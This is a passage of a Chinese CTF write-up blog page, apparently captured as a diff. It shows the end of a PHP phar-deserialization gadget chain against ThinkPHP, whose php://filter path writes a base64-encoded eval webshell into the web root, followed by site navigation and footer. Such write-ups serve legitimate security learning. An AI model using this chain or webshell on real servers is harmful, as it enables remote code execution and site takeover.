class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span>=<span class="title">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">Memcached</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>(<span class="title">new</span> \<span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>());</span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">new</span> think\console\Output(<span class="variable">$Memcached</span>);</span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\db\Query(<span class="variable">$Output</span>);</span><br><span class="line">    <span class="variable">$HasOne</span> = <span class="keyword">new</span> think\model\relation\HasOne(<span class="variable">$model</span>);</span><br><span class="line">    <span class="variable">$window</span> = <span class="keyword">new</span> think\process\pipes\Windows(<span class="keyword">new</span> think\model\Pivot(<span class="variable">$Output</span>,<span class="variable">$HasOne</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$window</span>);        </span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);        </span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>wuyusanhua
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wuyusanhua2021.github.io/2022/01/12/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/" title="长安战疫Web部分">https://wuyusanhua2021.github.io/2022/01/12/长安战疫部分题目/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+        
+      </div>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/10/De1CTF2019-SSRFMe/" rel="prev" title="De1CTF2019-SSRFMe">
+      <i class="fa fa-chevron-left"></i> De1CTF2019-SSRFMe
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/01/16/thinkphp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" rel="next" title="thinkphp5.0.24反序列化漏洞分析及复现">
+      thinkphp5.0.24反序列化漏洞分析及复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RCE-No-Para"><span class="nav-number">1.</span> <span class="nav-text">RCE_No_Para</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flask"><span class="nav-number">2.</span> <span class="nav-text">flask</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Flag%E9%85%8D%E9%80%81%E4%B8%AD%E5%BF%83"><span class="nav-number">3.</span> <span class="nav-text">Flag配送中心</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shiro-%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="nav-number">4.</span> <span class="nav-text">Shiro?(未完成)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Baby-Upload"><span class="nav-number">5.</span> <span class="nav-text">Baby_Upload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#tp-%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="nav-number">6.</span> <span class="nav-text">tp(未完成)</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wuyusanhua"
+      src="/images/sakuya.png">
+  <p class="site-author-name" itemprop="name">wuyusanhua</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">雾雨散花</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">40k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">36 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
